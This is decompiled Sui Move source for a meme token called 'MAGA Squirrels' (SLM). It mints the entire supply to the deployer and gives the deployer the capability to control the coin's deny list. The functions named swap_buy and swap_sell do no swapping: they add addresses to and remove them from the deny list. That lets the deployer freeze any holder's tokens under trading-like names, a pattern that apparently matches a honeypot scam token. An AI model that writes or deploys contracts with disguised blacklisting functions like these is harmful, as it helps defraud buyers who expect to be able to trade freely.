module 0xa5493abfa07177e9e47f2e54b2f10bc88b28ed6c831bdf737b227b027340673c::slm {
    struct SLM has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SLM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SLM>(arg0, 9, b"SLM", b"MAGA Squirrels", b"Defending nuts and patriotism", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQA1UNU6yTJoNgL9WKtTFhDwBcBnryraGR9c9MEQWBwkn"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SLM>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SLM>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SLM>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SLM>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SLM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SLM>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SLM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SLM>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

